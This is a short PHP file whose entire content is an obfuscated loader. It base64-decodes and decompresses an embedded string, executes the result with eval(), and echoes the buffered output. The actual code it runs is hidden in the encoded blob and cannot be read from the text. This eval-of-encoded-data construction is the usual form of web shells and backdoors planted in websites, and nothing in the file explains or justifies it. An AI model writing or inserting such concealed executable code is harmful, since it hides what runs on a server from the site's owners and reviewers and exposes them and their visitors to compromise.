<?php
ob_start();
$data = 'eNrLTFPQyE+KT08tic9JzUsvydDQ1FSoVgAKpealxCfnpCbmaWhaK9Qq2NvZ2BdkFPByKWTmJeeUpqQqqCcWFOiXpBaX6AHF1a2BKni5kCEAR8EZmA==';
eval(gzuncompress(base64_decode($data)));
$output = ob_get_contents();
ob_end_clean();
echo $output;
?>